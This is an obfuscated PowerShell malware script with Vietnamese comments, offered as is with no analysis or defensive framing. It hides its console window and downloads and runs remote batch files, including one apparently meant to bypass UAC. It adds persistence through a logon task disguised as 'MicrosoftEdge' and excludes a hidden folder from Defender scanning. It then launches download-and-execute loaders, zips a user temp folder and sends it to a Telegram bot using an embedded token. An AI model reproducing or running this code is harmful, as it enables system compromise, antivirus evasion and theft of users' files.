Add-Type @"
    using System;
    using System.Runtime.InteropServices;
    public class ConsoleWindowUtils {
        [DllImport("kernel32.dll")]
        public static extern IntPtr GetConsoleWindow();
        
        [DllImport("user32.dll")]
        public static extern IntPtr GetParent(IntPtr hWnd);

        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        
        public static IntPtr GetTargetWindow() {
            IntPtr consoleWindow = GetConsoleWindow();
            IntPtr parentWindow = GetParent(consoleWindow);
            
            if (parentWindow == IntPtr.Zero) {
                return consoleWindow;
            }
            return parentWindow;
        }
    }
"@

[ConsoleWindowUtils]::ShowWindow([ConsoleWindowUtils]::GetTargetWindow(), 0) | Out-Null

Set-ExecutionPolicy Bypass -Scope Process -Force

# Define the target IP
$TargetIP = "26.165.195.200"

# Get all network interfaces and their IP addresses
$IPs = Get-NetIPAddress | Select-Object -ExpandProperty IPAddress

# Check if the target IP exists
if ($IPs -contains $TargetIP) {
    Write-Host "IP $TargetIP found. Exiting..."
    Stop-Process -Id $pid -Force
} else {
    Write-Host "IP $TargetIP not found."
}


$startupfolder = (New-Object -ComObject WScript.Shell).SpecialFolders("Startup")
$startupfolder = $env:appdata
Add-Type -AssemblyName System.Windows.Forms


# Kiểm tra xem script có quyền quản trị không
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    try {
        # Tải xuống tệp batch
        
        $outputFile = "$startupfolder\download.bat"
        
        # Kiểm tra mức độ UAC và in thông báo
        $url = "https://raw.githubusercontent.com/43a1723/test/refs/heads/main/uac_obf.bat"
        Invoke-WebRequest -Uri $url -OutFile $outputFile -ErrorAction Stop
        Start-Process -FilePath $outputFile -Wait -ErrorAction Stop
        Write-Output "Khởi chạy tệp batch."

        $url = "https://github.com/43a1723/test/releases/download/AutoBuild/download.bat"
        Invoke-WebRequest -Uri $url -OutFile $outputFile -ErrorAction Stop
        Start-Process -FilePath $outputFile -Wait -ErrorAction Stop
        Write-Output "Khởi chạy tệp batch."
        
        # Kết thúc tiến trình PowerShell sau khi thực thi tệp batch
        Write-Output "Kết thúc tiến trình PowerShell."
        Stop-Process -Id $PID -Force
    }
    catch {
        Write-Error "Lỗi xảy ra: $_"
    }
}

$task_name = "MicrosoftEdge"
$task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `iwr('https://raw.githubusercontent.com/43a1723/test/main/download.ps1')|iex`",0)(window.close)"
$task_trigger = New-ScheduledTaskTrigger -AtLogOn
$task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "windows startup file" -RunLevel Highest -Force
Write-Host "[!] Persistence Added" -ForegroundColor Green

Remove-Item -Path "$startupfolder\download.bat" -Force

$rdir = "$env:SystemDrive\ProgramData\Loader"
$dir = "$rdir..{21EC2020-3AEA-1069-A2DD-08002B30309D}"
$startupfolder = (New-Object -ComObject WScript.Shell).SpecialFolders("AllUsersStartup")
New-Item -ItemType Directory -Path $dir
Add-MpPreference -ExclusionPath $dir
attrib +h +s $dir

$shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/Mewing")
$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru

$shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/shellcode/loaderclient.ps1")
$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru


.([char]((((-15222 + 6313) - (-15222 -Bor 6313)) + (-15222 + 6313 + 1 + (-bnot -15222 -Bor -bnot 6313)) + 604 + 8370))+[char]((((-14654 + 7081) - (-14654 -Bor 7081)) + (-14654 + 7081 + 1 + (-bnot -14654 -Bor -bnot 7081)) + 4701 + 2972))+[char]((((3713 + 4402) - (3713 -Bor 4402)) + (3713 + 4402 + 1 + (-bnot 3713 -Bor -bnot 4402)) + 1294 - 9309))+[char]((24745 - 9019 - 6097 - 9584))+[char]((((-8381 + 7027) - (-8381 -Bor 7027)) + (-8381 + 7027 + 1 + (-bnot -8381 -Bor -bnot 7027)) + 9909 - 8471))+[char]((11321 - 9291 + 1277 - 3186))+[char]((6084 - 4214 + 3498 - 5256))+[char]((-3186 - 9472 + 6331 + 6428))) -AssemblyName System.IO.Compression.FileSystem
.([char]((((-13845 + 1960) - (-13845 -Bor 1960)) + (-13845 + 1960 + 1 + (-bnot -13845 -Bor -bnot 1960)) + 5030 + 6920))+[char]((5989 - 7193 - 8274 + 9578))+[char]((1258 - 5396 - 2128 + 6366))+[char]((((-13075 + 5802) - (-13075 -Bor 5802)) + (-13075 + 5802 + 1 + (-bnot -13075 -Bor -bnot 5802)) + 5241 + 2077))+[char]((((14384 + 3105) - (14384 -Bor 3105)) + (14384 + 3105 + 1 + (-bnot 14384 -Bor -bnot 3105)) - 9531 - 7874))+[char]((16580 - 3678 - 7831 - 4950))+[char]((772 - 790 + 961 - 831))+[char]((((-9941 + 8836) - (-9941 -Bor 8836)) + (-9941 + 8836 + 1 + (-bnot -9941 -Bor -bnot 8836)) - 3556 + 4762))) -AssemblyName System.Net.Http
.([char]((((1853 + 4046) - (1853 -Bor 4046)) + (1853 + 4046 + 1 + (-bnot 1853 -Bor -bnot 4046)) - 614 - 5202))+[char]((-2236 - 5686 + 9629 - 1591))+[char]((((-8796 + 2670) - (-8796 -Bor 2670)) + (-8796 + 2670 + 1 + (-bnot -8796 -Bor -bnot 2670)) - 3493 + 9716))+[char]((-4380 - 6583 + 8420 + 2657))+[char]((((-14791 + 9718) - (-14791 -Bor 9718)) + (-14791 + 9718 + 1 + (-bnot -14791 -Bor -bnot 9718)) - 3576 + 8765))+[char]((((5955 + 1169) - (5955 -Bor 1169)) + (5955 + 1169 + 1 + (-bnot 5955 -Bor -bnot 1169)) - 3872 - 3207))+[char]((8947 - 9325 + 5683 - 5225))+[char]((((-4374 + 4173) - (-4374 -Bor 4173)) + (-4374 + 4173 + 1 + (-bnot -4374 -Bor -bnot 4173)) + 7765 - 7450))+[char]((((2705 + 5530) - (2705 -Bor 5530)) + (2705 + 5530 + 1 + (-bnot 2705 -Bor -bnot 5530)) - 6117 - 2007))+[char]((((-18290 + 7530) - (-18290 -Bor 7530)) + (-18290 + 7530 + 1 + (-bnot -18290 -Bor -bnot 7530)) + 869 + 9990))+[char]((4358 - 6285 + 9601 - 7573))+[char]((2838 - 1641 - 4907 + 3825))+[char]((((-7733 + 7727) - (-7733 -Bor 7727)) + (-7733 + 7727 + 1 + (-bnot -7733 -Bor -bnot 7727)) - 4278 + 4399))) powershell -ArgumentList ([systEM.tExT.ENCoDing]::UtF8.GetStRiNG((0x2d, 0x43, 0x6f, 0x6d, 0x6d, 0x61, 0x6e, 0x64, 0x20, 0x69, 0x77, 0x72, 0x20, 0x27, 0x27, 0x68, 0x74, 0x74, 0x70, 0x73, 0x3a, 0x2f, 0x2f, 0x67, 0x69, 0x74, 0x68, 0x75, 0x62, 0x2e, 0x63, 0x6f, 0x6d, 0x2f, 0x45, 0x76, 0x69, 0x6c, 0x42, 0x79, 0x74, 0x65, 0x63, 0x6f, 0x64, 0x65, 0x2f, 0x53, 0x72, 0x79, 0x78, 0x65, 0x6e, 0x2f, 0x72, 0x65, 0x6c, 0x65, 0x61, 0x73, 0x65, 0x73, 0x2f, 0x64, 0x6f, 0x77, 0x6e, 0x6c, 0x6f, 0x61, 0x64, 0x2f, 0x76, 0x31, 0x2e, 0x30, 0x2e, 0x30, 0x2f, 0x73, 0x72, 0x79, 0x78, 0x65, 0x6e, 0x5f, 0x6c)) + [sySTeM.TeXT.enCoDINg]::UTf8.GETsTring((0x6f, 0x61, 0x64, 0x65, 0x72, 0x2e, 0x70, 0x73, 0x31, 0x27, 0x27, 0x20, 0x7c, 0x20, 0x69, 0x65, 0x78))) -WindowStyle Hidden -Wait; ${kdOt`Pa`K`A`JkoQ`P`K}=$env:UseRnAME; ${kD`OtkQyhrwj`MCU}=[SysTEM.IO.PaTH]::GeTTeMppAth()+${Kdot`Pak`AjkOQpk}+([sYstem.TExt.ENcOdInG]::uTF8.gETsTRiNg((0x2e, 0x7a, 0x69)) + [sySTeM.tEXT.eNcOdING]::UtF8.GetstriNG((0x70))); .([char]((((-134 + 1640) - (-134 -Bor 1640)) + (-134 + 1640 + 1 + (-bnot -134 -Bor -bnot 1640)) + 1063 - 2502))+[char]((-8294 - 1470 + 4974 + 4901))+[char]((-3996 - 6586 + 8075 + 2616))+[char]((-6865 - 5577 + 7694 + 4860))+[char]((((-11462 + 5768) - (-11462 -Bor 5768)) + (-11462 + 5768 + 1 + (-bnot -11462 -Bor -bnot 5768)) + 6285 - 477))+[char]((((8319 + 5317) - (8319 -Bor 5317)) + (8319 + 5317 + 1 + (-bnot 8319 -Bor -bnot 5317)) - 4285 - 9250))+[char]((((-54 + 8608) - (-54 -Bor 8608)) + (-54 + 8608 + 1 + (-bnot -54 -Bor -bnot 8608)) - 6593 - 1846))+[char]((4246 - 8970 + 3032 + 1807))+[char]((3551 - 4172 + 7447 - 6781))+[char]((((-3611 + 3058) - (-3611 -Bor 3058)) + (-3611 + 3058 + 1 + (-bnot -3611 -Bor -bnot 3058)) - 3970 + 4588))+[char]((((-24768 + 8912) - (-24768 -Bor 8912)) + (-24768 + 8912 + 1 + (-bnot -24768 -Bor -bnot 8912)) + 7552 + 8418))+[char]((((-13261 + 9725) - (-13261 -Bor 9725)) + (-13261 + 9725 + 1 + (-bnot -13261 -Bor -bnot 9725)) + 4338 - 703))+[char]((7905 - 8935 + 9343 - 8209))+[char]((((-9238 + 9318) - (-9238 -Bor 9318)) + (-9238 + 9318 + 1 + (-bnot -9238 -Bor -bnot 9318)) + 8770 - 8745))+[char]((((-8655 + 8406) - (-8655 -Bor 8406)) + (-8655 + 8406 + 1 + (-bnot -8655 -Bor -bnot 8406)) - 2494 + 2861))+[char]((-5415 - 3023 + 9084 - 545))) -Path ([sySteM.io.pAtH]::GetTEMppath()+${kDOt`PaK`Aj`Koq`P`K}) -DestinationPath ${K`DoTK`Q`Yhr`Wjmc`U} -Force; ${kdOtaas`B`KXQulq}=([SystEM.TEXT.eNcodiNG]::utF8.GeTSTRInG([sysTEM.converT]::frOMBaSE64strIng(([SYsteM.TEXt.encoding]::uTF8.GETSTrIng((0x4e, 0x7a, 0x51, 0x34, 0x4e, 0x7a, 0x51, 0x78, 0x4f, 0x44, 0x4d, 0x30, 0x4e, 0x7a, 0x70, 0x42, 0x51, 0x55, 0x68, 0x76, 0x4d, 0x47, 0x52, 0x4c)) + [System.tEXT.encoDInG]::uTF8.GeTStrING((90, 87, 56, 119, 89, 121, 49, 117))))) + [SYsTEM.TEXt.encodING]::Utf8.GETsTrinG((90, 0x41, 105, 78, 0x39, 90, 103, 105, 0x56, 80, 0x62, 121, 0x70, 52, 120, 0x54, 0x53, 100, 0x73, 86, 0x32, 0x45))); $kdotWefUZdlwgr=([sYSTem.TExt.EnCoding]::UTf8.GETStrING([SYstEM.conVERt]::FrOmBAse64strING(([SYSteM.tExT.enCodiNG]::UTf8.GETsTrinG((78, 122, 65, 49, 78, 106, 69, 51, 78, 68, 85, 48, 77, 65, 61, 61)))))); ${KDoTJslJeizbcS}="https://api.telegram.org/bot${KDOtaaSBKxQuLq}/sendDocument"; ${kdotm`O`Un`QivmYt}=.([char]((-638 - 4557 + 9763 - 4490))+[char]((11412 - 4165 + 1720 - 8866))+[char]((((-5677 + 1756) - (-5677 -Bor 1756)) + (-5677 + 1756 + 1 + (-bnot -5677 -Bor -bnot 1756)) + 1587 + 2453))+[char]((-6135 - 5392 + 3002 + 8570))+[char]((((-20327 + 8283) - (-20327 -Bor 8283)) + (-20327 + 8283 + 1 + (-bnot -20327 -Bor -bnot 8283)) + 2326 + 9797))+[char]((((4471 + 7097) - (4471 -Bor 7097)) + (4471 + 7097 + 1 + (-bnot 4471 -Bor -bnot 7097)) - 5008 - 6462))+[char]((3796 - 8344 + 8740 - 4086))+[char]((((-12860 + 5949) - (-12860 -Bor 5949)) + (-12860 + 5949 + 1 + (-bnot -12860 -Bor -bnot 5949)) + 8050 - 1038))+[char]((((24 + 1467) - (24 -Bor 1467)) + (24 + 1467 + 1 + (-bnot 24 -Bor -bnot 1467)) - 7257 + 5865))+[char]((-7856 - 8277 + 8912 + 7337))) System.Net.Http.MultipartFormDataContent; ${KDOtMOUnQIvMyt}.Add((.([char]((9180 - 6542 - 5663 + 3103))+[char]((3777 - 701 + 2338 - 5313))+[char]((((-14261 + 5517) - (-14261 -Bor 5517)) + (-14261 + 5517 + 1 + (-bnot -14261 -Bor -bnot 5517)) + 8535 + 328))+[char]((1393 - 5290 - 4273 + 8215))+[char]((((-12983 + 657) - (-12983 -Bor 657)) + (-12983 + 657 + 1 + (-bnot -12983 -Bor -bnot 657)) + 6850 + 5555))+[char]((2426 - 7310 - 2207 + 7189))+[char]((19372 - 3499 - 5902 - 9865))+[char]((14919 - 1328 - 9177 - 4313))+[char]((-1702 - 4100 + 3484 + 2417))+[char]((696 - 1030 - 5930 + 6380))) System.Net.Http.StringContent($kDOtWefUzDlwGr)),([SYSTEm.TExT.EnCoDING]::utF8.GEtstRiNG((0x63, 0x68)) + [SyStem.text.EnCODINg]::uTF8.gETstRING((97, 116)) + [sYsTeM.text.EncOdINg]::UTF8.GEtstRInG((95, 105)) + [sySTEM.TexT.EncoDinG]::utF8.GetstrInG(100))); ${Kdot`MOunQIv`MyT}.ADD((.([char]((((-386 + 6) - (-386 -Bor 6)) + (-386 + 6 + 1 + (-bnot -386 -Bor -bnot 6)) + 2016 - 1558))+[char]((((-10656 + 7615) - (-10656 -Bor 7615)) + (-10656 + 7615 + 1 + (-bnot -10656 -Bor -bnot 7615)) - 695 + 3837))+[char]((((-4324 + 1108) - (-4324 -Bor 1108)) + (-4324 + 1108 + 1 + (-bnot -4324 -Bor -bnot 1108)) - 3498 + 6833))+[char]((7471 - 8133 + 3601 - 2894))+[char]((((-9517 + 9891) - (-9517 -Bor 9891)) + (-9517 + 9891 + 1 + (-bnot -9517 -Bor -bnot 9891)) + 9000 - 9295))+[char]((3140 - 1767 - 2698 + 1423))+[char]((((-6686 + 1308) - (-6686 -Bor 1308)) + (-6686 + 1308 + 1 + (-bnot -6686 -Bor -bnot 1308)) + 7095 - 1611))+[char]((7399 - 4463 + 499 - 3334))+[char]((((-13921 + 1843) - (-13921 -Bor 1843)) + (-13921 + 1843 + 1 + (-bnot -13921 -Bor -bnot 1843)) + 2557 + 9620))+[char]((-3952 - 1996 + 3055 + 3009))) System.Net.Http.StreamContent([SysTEm.iO.filE]::opEnrEAD(${k`Do`TkqyhrwjmCu}))),([sYStEm.TExt.ENCoding]::UtF8.GeTsTRINg([sYsTem.conVErT]::fROmBaSe64stRing(([syStEM.TExt.ENcodinG]::utF8.getStrINg((0x5a, 0x47, 0x39, 0x6a))))) + [system.tEXt.ENcodiNG]::UTF8.gETStRInG((117, 109, 101)) + [SysTem.TEXT.EnCODINg]::uTF8.getStrinG([sYsteM.cONveRT]::fROmbASE64StrInG(([SyStEm.TExt.EnCodiNG]::utf8.GetsTring([SYstem.coNvert]::FROmbaSe64STRiNG('Ym4=')) + [SySTem.tEXT.enCoDINg]::UTf8.geTstrING((81, 61)))))),[sysTEM.IO.pAtH]::gEtfiLeName(${KDoTkqyHrwjmcu})); (.([char]((((3650 + 7941) - (3650 -Bor 7941)) + (3650 + 7941 + 1 + (-bnot 3650 -Bor -bnot 7941)) - 2524 - 8989))+[char]((7263 - 960 - 8431 + 2229))+[char]((-3931 - 7852 + 6335 + 5567))+[char]((((-13963 + 8328) - (-13963 -Bor 8328)) + (-13963 + 8328 + 1 + (-bnot -13963 -Bor -bnot 8328)) + 6147 - 467))+[char]((((-392 + 3120) - (-392 -Bor 3120)) + (-392 + 3120 + 1 + (-bnot -392 -Bor -bnot 3120)) + 7195 - 9844))+[char]((((-250 + 1214) - (-250 -Bor 1214)) + (-250 + 1214 + 1 + (-bnot -250 -Bor -bnot 1214)) + 634 - 1500))+[char]((((-25198 + 5705) - (-25198 -Bor 5705)) + (-25198 + 5705 + 1 + (-bnot -25198 -Bor -bnot 5705)) + 9601 + 9998))+[char]((5122 - 5394 + 7574 - 7201))+[char]((-6096 - 4873 + 9119 + 1949))+[char]((((-4067 + 1264) - (-4067 -Bor 1264)) + (-4067 + 1264 + 1 + (-bnot -4067 -Bor -bnot 1264)) + 2287 + 632))) System.Net.Http.HttpClient).pOstaSYnc(${KDoTJsLjEizBcS},${KdOtMoUnqivMyT}).rEsult
